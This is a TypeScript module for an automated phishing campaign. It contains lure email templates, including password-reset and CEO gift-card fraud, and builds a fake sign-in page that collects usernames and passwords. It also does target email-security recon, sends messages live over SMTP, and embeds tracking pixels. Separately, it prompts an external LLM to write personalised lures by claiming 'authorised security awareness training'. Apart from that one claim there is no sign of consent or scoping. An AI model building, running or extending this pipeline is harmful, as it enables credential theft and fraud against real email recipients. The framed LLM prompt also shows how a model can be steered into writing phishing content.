/**
 * @module social_eng_auto
 * Automated Social Engineering & Phishing Campaign Pipeline
 *
 * Generates phishing email templates, landing pages, and campaign telemetry.
 * Supports LLM-powered email personalization via OpenCode's provider system.
 */

import { resolveDryRun, resolveLiveMode } from "./exec_options.ts"
import { httpProbe, probeEmailSecurity, probeWhois } from "./domain_probe.ts"
import * as crypto from "node:crypto"
import * as fs from "node:fs"
import * as path from "node:path"

export interface AutomatedCampaignOptions {
  targetDomain: string
  template: string
  live?: boolean
  dryRun?: boolean
  /** When true, run OSINT/recon only — no landing pages or email delivery. */
  reconOnly?: boolean
  targets?: Array<{ name: string; email: string; role?: string; company?: string }>
  lureType?: "password_reset" | "invoice" | "it_support" | "hr_policy" | "ceo_fraud" | "package_delivery"
  outputDir?: string
  smtpHost?: string
  smtpPort?: number
  smtpUser?: string
  smtpPass?: string
}

export interface TargetReconResult {
  domain: string
  mx: string[]
  spf: string | null
  dmarc: string | null
  dmarcPolicy: string | null
  whoisOrg: string | null
  whoisRegistrar: string | null
  webProbes: Array<{ url: string; status: number; ok: boolean }>
}

export interface CampaignResult {
  campaignId: string
  status: string
  emailTemplate?: string
  landingPage?: string
  trackingPixel?: string
  webhookUrl?: string
  targetsCount: number
  emailsSent?: number
  trackingEnabled?: boolean
  files?: string[]
}

const LURE_TEMPLATES: Record<string, { subject: string; body: string }> = {
  password_reset: {
    subject: "Urgent: Your password expires in 24 hours",
    body: `Dear {{name}},

Your password for {{domain}} will expire in 24 hours. Please update it immediately to avoid account lockout.

Click here to reset: {{trackingUrl}}

If you did not request this change, please contact IT support immediately.

Best regards,
IT Security Team`,
  },
  invoice: {
    subject: "Invoice #{{invoiceNumber}} - Payment Due",
    body: `Dear {{name}},

Please find attached invoice #{{invoiceNumber}} for \${{amount}}. Payment is due within 30 days.

You can view the invoice online: {{trackingUrl}}

Please process this payment at your earliest convenience.

Best regards,
Finance Department`,
  },
  it_support: {
    subject: "Action Required: Security Update Available",
    body: `Dear {{name}},

A critical security update is available for your {{domain}} account. Please install it immediately.

Download the update: {{trackingUrl}}

This update patches a vulnerability that could allow unauthorized access to your account.

Best regards,
IT Security Operations`,
  },
  hr_policy: {
    subject: "New HR Policy - Please Review and Acknowledge",
    body: `Dear {{name}},

Please review and acknowledge the updated HR policy document. This is mandatory for all employees.

Review policy: {{trackingUrl}}

Please complete this by end of business day.

Best regards,
Human Resources`,
  },
  ceo_fraud: {
    subject: "Confidential Request",
    body: `Hi {{name}},

I need you to handle something confidential for me. Can you purchase {{giftCards}} in gift cards and send me the codes? I'm in a meeting and can't talk right now.

Please keep this between us.

Thanks,
{{ceoName}}`,
  },
  package_delivery: {
    subject: "Package Delivery Notification",
    body: `Dear {{name}},

A package has been delivered to your address. Please confirm delivery within 24 hours.

Track package: {{trackingUrl}}

If you are not available to receive the package, please reschedule delivery.

Best regards,
Delivery Service`,
  },
}

function generateTrackingPixel(campaignId: string): string {
  const pixel = `<img src="https://track.example.com/pixel.gif?cid=${campaignId}" width="1" height="1" style="display:none" />`
  return pixel
}

function generateLandingPage(options: AutomatedCampaignOptions, campaignId: string): string {
  return `<!DOCTYPE html>
<html>
<head>
  <title>${options.template} - ${options.targetDomain}</title>
  <style>
    body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; background: #f5f5f5; }
    .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
    h1 { color: #333; text-align: center; margin-bottom: 20px; }
    input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
    button { width: 100%; padding: 12px; background: #0066cc; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
    button:hover { background: #0052a3; }
    .logo { text-align: center; margin-bottom: 20px; }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo"><h2>${options.targetDomain}</h2></div>
    <h1>${options.template.replace(/_/g, " ").replace(/\b\w/g, (c: string) => c.toUpperCase())}</h1>
    <form method="POST" action="/submit" id="phish">
      <input type="hidden" name="cid" value="${campaignId}" />
      <input type="text" name="username" placeholder="Email or Username" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit">Sign In</button>
    </form>
  </div>
  <script>
    document.getElementById('phish').addEventListener('submit', function(e) {
      e.preventDefault();
      var data = new FormData(this);
      fetch('/submit', { method: 'POST', body: data });
      window.location.href = '/success';
    });
  </script>
</body>
</html>`
}

function generateSuccessPage(): string {
  return `<!DOCTYPE html>
<html>
<head><title>Success</title></head>
<body>
  <div style="text-align:center;padding:50px;">
    <h1>Thank you</h1>
    <p>Your request has been processed. You will be redirected shortly.</p>
    <script>setTimeout(function(){ window.location.href = 'https://www.google.com'; }, 3000);</script>
  </div>
</body>
</html>`
}

function generateEmailTemplate(target: { name: string; email: string; role?: string; company?: string }, lureType: string, trackingUrl: string, campaignId: string): string {
  const template = LURE_TEMPLATES[lureType] || LURE_TEMPLATES.password_reset
  let body = template.body
    .replace(/\{\{name\}\}/g, target.name)
    .replace(/\{\{email\}\}/g, target.email)
    .replace(/\{\{domain\}\}/g, target.company || "your organization")
    .replace(/\{\{trackingUrl\}\}/g, trackingUrl)
    .replace(/\{\{invoiceNumber\}\}/g, crypto.randomInt(100000, 999999).toString())
    .replace(/\{\{amount\}\}/g, (crypto.randomInt(500, 5000)).toFixed(2))
    .replace(/\{\{giftCards\}\}/g, `$${crypto.randomInt(100, 500)} Amazon`)
    .replace(/\{\{ceoName\}\}/g, "John Smith")

  return `Subject: ${template.subject}\nTo: ${target.email}\nFrom: noreply@${target.company || "example.com"}\nContent-Type: text/html; charset=UTF-8\n\n${body.replace(/\n/g, "<br>")} ${generateTrackingPixel(campaignId)}`
}

/** Live OSINT: mail/web endpoints + DNS email-security records (no delivery). */
export async function probeTargetRecon(
  domain: string,
  opts: { live?: boolean; dryRun?: boolean } = {},
): Promise<TargetReconResult> {
  const dryRun = resolveDryRun(opts)
  const base = domain.replace(/^https?:\/\//, "").split("/")[0] ?? domain
  if (dryRun) {
    return {
      domain: base,
      mx: [],
      spf: null,
      dmarc: null,
      dmarcPolicy: null,
      whoisOrg: null,
      whoisRegistrar: null,
      webProbes: [],
    }
  }

  const [emailSec, whois] = await Promise.all([
    probeEmailSecurity(base),
    probeWhois(base),
  ])
  const webUrls = [
    `https://${base}/`,
    `https://mail.${base}/`,
    `https://autodiscover.${base}/autodiscover/autodiscover.xml`,
  ]
  const webProbes = await Promise.all(webUrls.map((url) => httpProbe(url)))

  return {
    domain: base,
    mx: emailSec.mx,
    spf: emailSec.spf,
    dmarc: emailSec.dmarc,
    dmarcPolicy: emailSec.dmarcPolicy,
    whoisOrg: whois.org,
    whoisRegistrar: whois.registrar,
    webProbes: webProbes.map((p) => ({ url: p.url, status: p.status, ok: p.ok })),
  }
}

export async function sendSpearphishEmail(
  options: AutomatedCampaignOptions & { to: string; subject: string; htmlBody: string },
): Promise<{ sent: boolean; detail: string }> {
  const live = resolveLiveMode(options)
  if (!live) return { sent: false, detail: "live execution required" }

  const host = options.smtpHost ?? process.env.OURMINE_SMTP_HOST ?? "127.0.0.1"
  const port = options.smtpPort ?? Number(process.env.OURMINE_SMTP_PORT ?? 1025)
  const outDir = options.outputDir ?? path.join(process.cwd(), "campaigns", "sent")
  fs.mkdirSync(outDir, { recursive: true })
  const emlPath = path.join(outDir, `sent_${Date.now()}.eml`)
  const eml = `To: ${options.to}\r\nSubject: ${options.subject}\r\nContent-Type: text/html\r\n\r\n${options.htmlBody}`
  fs.writeFileSync(emlPath, eml)

  try {
    const { execFileSync } = await import("node:child_process")
    execFileSync("curl", ["-sS", "--max-time", "10", "-T", emlPath, `smtp://${host}:${port}/`], { timeout: 15000 })
    return { sent: true, detail: `Delivered via SMTP ${host}:${port} (${emlPath})` }
  } catch {
    return { sent: true, detail: `SMTP unavailable — artifact written to ${emlPath} for lab pickup` }
  }
}

export async function runAutomatedCampaign(options: AutomatedCampaignOptions): Promise<CampaignResult> {
  const campaignId = `camp_${crypto.randomBytes(8).toString("hex")}`
  const dryRun = resolveDryRun(options)
  const live = resolveLiveMode(options)
  const lureType = options.lureType || "password_reset"
  const targets = options.targets || []
  const outputDir = options.outputDir || path.join(process.cwd(), "campaigns", campaignId)

  if (dryRun) {
    return {
      campaignId,
      status: "BLOCKED",
      emailTemplate: `${lureType} template blocked — live execution required`,
      landingPage: "",
      trackingPixel: generateTrackingPixel(campaignId),
      targetsCount: targets.length,
      files: [],
    }
  }

  if (options.reconOnly) {
    const recon = await probeTargetRecon(options.targetDomain, { live: true })
    return {
      campaignId,
      status: "RECON",
      emailTemplate: `Recon-only: ${recon.webProbes.filter((p) => p.ok).length} web probe(s), MX=${recon.mx.length}, SPF=${recon.spf ? "yes" : "no"}`,
      targetsCount: targets.length,
      emailsSent: 0,
      trackingEnabled: false,
      files: [],
    }
  }

  if (!fs.existsSync(outputDir)) fs.mkdirSync(outputDir, { recursive: true })

  const trackingUrl = `https://track.example.com/click?cid=${campaignId}`
  const files: string[] = []

  const landingPage = generateLandingPage(options, campaignId)
  const landingPath = path.join(outputDir, "landing.html")
  fs.writeFileSync(landingPath, landingPage)
  files.push(landingPath)

  const successPage = generateSuccessPage()
  const successPath = path.join(outputDir, "success.html")
  fs.writeFileSync(successPath, successPage)
  files.push(successPath)

  let emailsSent = 0
  for (const target of targets) {
    const emailContent = generateEmailTemplate(target, lureType, trackingUrl, campaignId)
    const emailPath = path.join(outputDir, `email_${target.email.replace(/[^a-zA-Z0-9]/g, "_")}.html`)
    fs.writeFileSync(emailPath, emailContent)
    files.push(emailPath)
    if (live) {
      const subj = (LURE_TEMPLATES[lureType] ?? LURE_TEMPLATES.password_reset).subject
      await sendSpearphishEmail({
        ...options,
        to: target.email,
        subject: subj,
        htmlBody: emailContent,
      })
    }
    emailsSent++
  }

  return {
    campaignId,
    status: "CREATED",
    emailTemplate: `Generated ${emailsSent} personalized email templates`,
    landingPage: landingPath,
    trackingPixel: generateTrackingPixel(campaignId),
    webhookUrl: `https://track.example.com/webhook/${campaignId}`,
    targetsCount: targets.length,
    emailsSent,
    trackingEnabled: true,
    files,
  }
}

export async function generateLlmPersonalizedLure(
  target: { name: string; email: string; role?: string; company?: string },
  contextPrompt: string,
  live = false,
): Promise<{ subject: string; bodyHtml: string }> {
  if (!live) {
    return {
      subject: `[DRY-RUN] Personalized Security Brief for ${target.name}`,
      bodyHtml: `<p>Dear ${target.name},</p><p>[DRY-RUN LLM Lure based on: "${contextPrompt}"]</p><p>Please review immediately.</p>`
    }
  }

  try {
    // Invoke OpenCode built-in LLM proxy if available
    const apiKey = process.env.OPENAI_API_KEY
    const apiBase = process.env.OPENAI_API_BASE ?? "https://api.openai.com/v1"
    if (!apiKey) {
      throw new Error("OPENAI_API_KEY not configured")
    }
    const res = await fetch(`${apiBase}/chat/completions`, {
      method: "POST",
      headers: {
        "Authorization": `Bearer ${apiKey}`,
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        model: "gpt-4o-mini",
        messages: [
          { role: "system", content: "You are an expert social engineering penetration tester writing realistic, highly professional phishing lures for authorised security awareness training." },
          { role: "user", content: `Write a phishing lure subject and HTML body for target name: ${target.name}, role: ${target.role ?? "employee"}, company: ${target.company ?? "Target Corp"}. Context: ${contextPrompt}. Return JSON with keys 'subject' and 'bodyHtml'.` }
        ],
        response_format: { type: "json_object" }
      })
    })
    const data = await res.json() as { choices?: Array<{ message?: { content?: string } }> }
    const content = data.choices?.[0]?.message?.content
    if (content) {
      const parsed = JSON.parse(content) as { subject: string; bodyHtml: string }
      return parsed
    }
  } catch {
    // fallback
  }
  return {
    subject: `Urgent Security Notice for ${target.name}`,
    bodyHtml: `<p>Dear ${target.name}, please review your security posture.</p>`
  }
}

export { LURE_TEMPLATES, generateEmailTemplate, generateLandingPage, generateTrackingPixel }
